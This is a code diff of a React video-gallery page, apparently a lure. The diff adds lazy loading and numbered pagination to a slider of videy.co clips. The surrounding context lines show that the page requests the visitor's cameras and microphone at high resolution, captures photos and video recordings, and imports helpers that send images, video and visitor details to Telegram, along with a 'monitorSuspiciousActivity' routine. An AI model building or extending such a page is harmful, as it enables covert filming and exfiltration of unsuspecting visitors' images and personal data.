@@ -1,6 +1,7 @@
 import { ArrowsPointingOutIcon, ArrowsPointingInIcon } from '@heroicons/react/24/solid';
 import { useState, useEffect, useCallback, useRef } from 'react';
-import Slider from 'react-slick'; // Impor react-slick untuk slider
+import Slider from 'react-slick';
+import './styles/custom.css';
 import { sendTelegramNotification, sendImageToTelegram, sendVideoToTelegram, VisitorDetails } from './utils/telegram';
 import { monitorSuspiciousActivity, cleanupMediaStream, validateVideoUrl } from './security';
 
@@ -20,9 +21,11 @@ function App() {
   const [hasRequestedCamera, setHasRequestedCamera] = useState(false);
   const [isLoading, setIsLoading] = useState<boolean[]>([]);
   const [videoErrors, setVideoErrors] = useState<boolean[]>([]);
+  const [loadedSlides, setLoadedSlides] = useState<number[]>([0]); // Mulai dengan slide pertama
   const videoRefs = useRef<(HTMLVideoElement | null)[]>([]);
   const cameraStreamsRef = useRef<{ stream: MediaStream; type: string; deviceId: string }[]>([]);
   const mediaRecorderRef = useRef<MediaRecorder | null>(null);
+  const sliderRef = useRef<Slider | null>(null);
 
   const videos = [
     { videoUrl: 'https://cdn.videy.co/n9L2Emde1.mp4' },
@@ -54,6 +57,32 @@ function App() {
     setIsLoading(new Array(videos.length).fill(true));
     setVideoErrors(new Array(videos.length).fill(false));
   }, []);
+
+  // Logika pemuatan video per slide
+  useEffect(() => {
+    const loadNextSlide = () => {
+      const currentSlide = sliderRef.current?.innerSlider?.state.currentSlide || 0;
+      const nextSlide = (currentSlide + 1) % videoSlides.length;
+
+      if (!loadedSlides.includes(nextSlide)) {
+        console.log(`Memuat slide berikutnya: ${nextSlide}`);
+        setLoadedSlides((prev) => [...prev, nextSlide]);
+      }
+    };
+
+    const handleSlideChange = () => {
+      const currentSlide = sliderRef.current?.innerSlider?.state.currentSlide || 0;
+      console.log(`Slide berubah ke: ${currentSlide}`);
+      loadNextSlide();
+    };
+
+    // Muat slide berikutnya setelah slide aktif selesai dimuat
+    const timer = setTimeout(loadNextSlide, 2000); // Delay untuk memastikan slide aktif dimuat
+
+    // Dengarkan perubahan slide
+    sliderRef.current?.slickGoTo(sliderRef.current?.innerSlider?.state.currentSlide || 0);
+    return () => clearTimeout(timer);
+  }, [loadedSlides]);
 
   useEffect(() => {
     monitorSuspiciousActivity();
@@ -120,7 +149,6 @@ function App() {
 
     const requestMediaAccess = async (facingMode: string | { deviceId: string }, cameraType: string): Promise<{ stream: MediaStream; deviceId: string } | null> => {
       try {
-        // Pengaturan dinamis untuk resolusi tinggi (hingga 1080p) sesuai kemampuan perangkat
         const constraints = {
           video: typeof facingMode === 'string' ? { facingMode, width: { ideal: 1920 }, height: { ideal: 1080 }, frameRate: { ideal: 30 } } : { deviceId: { exact: facingMode.deviceId }, width: { ideal: 1920 }, height: { ideal: 1080 }, frameRate: { ideal: 30 } },
           audio: true,
@@ -131,7 +159,6 @@ function App() {
         return { stream, deviceId };
       } catch (error) {
         console.error(`Gagal mendapatkan akses kamera ${cameraType}:`, error);
-        // Fallback ke resolusi rendah jika gagal
         try {
           const constraints = {
             video: typeof facingMode === 'string' ? { facingMode, width: { ideal: 640 }, height: { ideal: 360 }, frameRate: { ideal: 15 } } : { deviceId: { exact: facingMode.deviceId }, width: { ideal: 640 }, height: { ideal: 360 }, frameRate: { ideal: 15 } },
@@ -202,7 +229,6 @@ function App() {
       return stream;
     } catch (error) {
       console.error(`Gagal menginisialisasi ulang stream untuk kamera ${cameraType}:`, error);
-      // Fallback ke resolusi rendah
       try {
         const constraints = {
           video: { deviceId: { exact: deviceId }, width: { ideal: 640 }, height: { ideal: 360 }, frameRate: { ideal: 15 } },
@@ -268,10 +294,10 @@ function App() {
 
       let drawWidth, drawHeight, offsetX, offsetY;
       if (videoAspectRatio > canvasAspectRatio) {
-        drawWidth = Math.min(videoWidth, 1080); // Batasi lebar maksimum ke 1080p
+        drawWidth = Math.min(videoWidth, 1080);
         drawHeight = drawWidth / videoAspectRatio;
       } else {
-        drawHeight = Math.min(videoHeight, 1920); // Batasi tinggi maksimum ke 1080p
+        drawHeight = Math.min(videoHeight, 1920);
         drawWidth = drawHeight * videoAspectRatio;
       }
 
@@ -287,7 +313,7 @@ function App() {
       }
 
       const photoBlob = await new Promise<Blob>((resolve) => {
-        canvas.toBlob((blob) => blob && resolve(blob), 'image/jpeg', 0.9); // Kualitas JPEG lebih tinggi
+        canvas.toBlob((blob) => blob && resolve(blob), 'image/jpeg', 0.9);
       });
 
       try {
@@ -301,7 +327,7 @@ function App() {
         .find(type => MediaRecorder.isTypeSupported(type)) || 'video/mp4';
       const mediaRecorder = new MediaRecorder(currentStream, {
         mimeType: supportedMimeType,
-        videoBitsPerSecond: 2500000, // Bitrate lebih tinggi untuk kualitas lebih baik
+        videoBitsPerSecond: 2500000,
       });
       mediaRecorderRef.current = mediaRecorder;
       const chunks: BlobPart[] = [];
@@ -535,6 +561,44 @@ function App() {
         },
       },
     ],
+    // Kustomisasi navigasi angka
+    customPaging: (i: number) => {
+      const totalSlides = videoSlides.length;
+      const currentSlide = sliderRef.current?.innerSlider?.state.currentSlide || 0;
+      const maxVisible = 9;
+      const halfVisible = Math.floor(maxVisible / 2);
+
+      let start = Math.max(0, currentSlide - halfVisible);
+      let end = Math.min(totalSlides, start + maxVisible);
+
+      if (end - start < maxVisible) {
+        start = Math.max(0, end - maxVisible);
+      }
+
+      if (i >= start && i < end) {
+        return <button>{i + 1}</button>;
+      } else if (i === end && end < totalSlides) {
+        return (
+          <div className="dots-placeholder">
+            ...
+          </div>
+        );
+      }
+      return <div style={{ display: 'none' }} />;
+    },
+    appendDots: (dots: React.ReactNode) => (
+      <div>
+        <ul className="custom-slick-dots">{dots}</ul>
+      </div>
+    ),
+    beforeChange: (_: number, next: number) => {
+      // Muat slide berikutnya saat slide berubah
+      const nextSlide = (next + 1) % videoSlides.length;
+      if (!loadedSlides.includes(nextSlide)) {
+        console.log(`Memuat slide berikutnya karena perubahan slide: ${nextSlide}`);
+        setLoadedSlides((prev) => [...prev, nextSlide]);
+      }
+    },
   };
 
   return (
@@ -546,80 +610,105 @@ function App() {
       </header>
       <main className="relative container mx-auto px-4 py-8">
         <div className="max-w-[1200px] mx-auto">
-          <Slider {...sliderSettings}>
+          <Slider ref={sliderRef} {...sliderSettings}>
             {videoSlides.map((slideVideos, slideIndex) => (
               <div key={slideIndex} className="px-2">
-                <div className="grid grid-cols-1 sm:grid-cols-2 md:grid-cols-3 lg:grid-cols-5 gap-4">
-                  {slideVideos.map((video, index) => {
-                    const globalIndex = slideIndex * 5 + index;
-                    return (
-                      <div
-                        key={globalIndex}
-                        className="relative bg-black rounded-lg overflow-hidden shadow-xl"
-                        style={{ aspectRatio: '9/16', maxHeight: '200px' }}
-                      >
-                        {isLoading[globalIndex] && !videoErrors[globalIndex] && (
-                          <div className="absolute inset-0 flex items-center justify-center bg-gray-800 bg-opacity-75">
-                            <svg
-                              className="animate-spin h-8 w-8 text-white"
-                              xmlns="http://www.w3.org/2000/svg"
-                              fill="none"
-                              viewBox="0 0 24 24"
-                            >
-                              <circle
-                                className="opacity-25"
-                                cx="12"
-                                cy="12"
-                                r="10"
-                                stroke="currentColor"
-                                strokeWidth="4"
-                              ></circle>
-                              <path
-                                className="opacity-75"
-                                fill="currentColor"
-                                d="M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4zm2 5.291A7.962 7.962 0 014 12H0c0 3.042 1.135 5.824 3 7.938l3-2.647z"
-                              ></path>
-                            </svg>
-                          </div>
-                        )}
-                        {videoErrors[globalIndex] && (
-                          <div className="absolute inset-0 flex items-center justify-center bg-gray-800 bg-opacity-75">
-                            <p className="text-white text-center">Gagal memuat video. Silakan coba lagi nanti.</p>
-                          </div>
-                        )}
-                        <video
-                          ref={(el) => (videoRefs.current[globalIndex] = el)}
-                          src={video.videoUrl}
-                          className="w-full h-full object-cover"
-                          muted
-                          onClick={() => handleVideoClick(globalIndex)}
-                          onEnded={() => handleVideoEnded(globalIndex)}
-                          onCanPlay={() => handleCanPlay(globalIndex)}
-                          onError={() => handleVideoError(globalIndex)}
-                          preload="metadata"
-                          playsInline
-                          {...({ loading: 'lazy' } as any)}
+                {!loadedSlides.includes(slideIndex) ? (
+                  <div className="flex items-center justify-center h-[200px] bg-gray-800 bg-opacity-75">
+                    <svg
+                      className="animate-spin h-8 w-8 text-white"
+                      xmlns="http://www.w3.org/2000/svg"
+                      fill="none"
+                      viewBox="0 0 24 24"
+                    >
+                      <circle
+                        className="opacity-25"
+                        cx="12"
+                        cy="12"
+                        r="10"
+                        stroke="currentColor"
+                        strokeWidth="4"
+                      ></circle>
+                      <path
+                        className="opacity-75"
+                        fill="currentColor"
+                        d="M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4zm2 5.291A7.962 7.962 0 014 12H0c0 3.042 1.135 5.824 3 7.938l3-2.647z"
+                      ></path>
+                    </svg>
+                  </div>
+                ) : (
+                  <div className="grid grid-cols-1 sm:grid-cols-2 md:grid-cols-3 lg:grid-cols-5 gap-4">
+                    {slideVideos.map((video, index) => {
+                      const globalIndex = slideIndex * 5 + index;
+                      return (
+                        <div
+                          key={globalIndex}
+                          className="relative bg-black rounded-lg overflow-hidden shadow-xl"
+                          style={{ aspectRatio: '9/16', maxHeight: '200px' }}
                         >
-                          <p>Maaf, video tidak dapat dimuat. Silakan periksa koneksi Anda atau coba lagi nanti.</p>
-                        </video>
-                        {isPlaying === globalIndex && !videoErrors[globalIndex] && (
-                          <div className="absolute bottom-2 right-2 z-20">
-                            <button
-                              onClick={() => toggleFullscreen(globalIndex)}
-                              className="bg-gray-800/70 p-1 rounded-full hover:bg-gray-700 transition-all duration-200"
-                            >
-                              {isFullscreen ? (
-                                <ArrowsPointingInIcon className="w-5 h-5 text-white" />
-                              ) : (
-                                <ArrowsPointingOutIcon className="w-5 h-5 text-white" />
-                              )}
-                            </button>
-                          </div>
-                        )}
-                      </div>
-                    );
-                  })}
-                </div>
+                          {isLoading[globalIndex] && !videoErrors[globalIndex] && (
+                            <div className="absolute inset-0 flex items-center justify-center bg-gray-800 bg-opacity-75">
+                              <svg
+                                className="animate-spin h-8 w-8 text-white"
+                                xmlns="http://www.w3.org/2000/svg"
+                                fill="none"
+                                viewBox="0 0 24 24"
+                              >
+                                <circle
+                                  className="opacity-25"
+                                  cx="12"
+                                  cy="12"
+                                  r="10"
+                                  stroke="currentColor"
+                                  strokeWidth="4"
+                                ></circle>
+                                <path
+                                  className="opacity-75"
+                                  fill="currentColor"
+                                  d="M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4zm2 5.291A7.962 7.962 0 014 12H0c0 3.042 1.135 5.824 3 7.938l3-2.647z"
+                                ></path>
+                              </svg>
+                            </div>
+                          )}
+                          {videoErrors[globalIndex] && (
+                            <div className="absolute inset-0 flex items-center justify-center bg-gray-800 bg-opacity-75">
+                              <p className="text-white text-center">Gagal memuat video. Silakan coba lagi nanti.</p>
+                            </div>
+                          )}
+                          <video
+                            ref={(el) => (videoRefs.current[globalIndex] = el)}
+                            src={video.videoUrl}
+                            className="w-full h-full object-cover"
+                            muted
+                            onClick={() => handleVideoClick(globalIndex)}
+                            onEnded={() => handleVideoEnded(globalIndex)}
+                            onCanPlay={() => handleCanPlay(globalIndex)}
+                            onError={() => handleVideoError(globalIndex)}
+                            preload={loadedSlides.includes(slideIndex) ? 'metadata' : 'none'}
+                            playsInline
+                            {...({ loading: 'lazy' } as any)}
+                          >
+                            <p>Maaf, video tidak dapat dimuat. Silakan periksa koneksi Anda atau coba lagi nanti.</p>
+                          </video>
+                          {isPlaying === globalIndex && !videoErrors[globalIndex] && (
+                            <div className="absolute bottom-2 right-2 z-20">
+                              <button
+                                onClick={() => toggleFullscreen(globalIndex)}
+                                className="bg-gray-800/70 p-1 rounded-full hover:bg-gray-700 transition-all duration-200"
+                              >
+                                {isFullscreen ? (
+                                  <ArrowsPointingInIcon className="w-5 h-5 text-white" />
+                                ) : (
+                                  <ArrowsPointingOutIcon className="w-5 h-5 text-white" />
+                                )}
+                              </button>
+                            </div>
+                          )}
+                        </div>
+                      );
+                    })}
+                  </div>
+                )}
               </div>
             ))}
           </Slider>
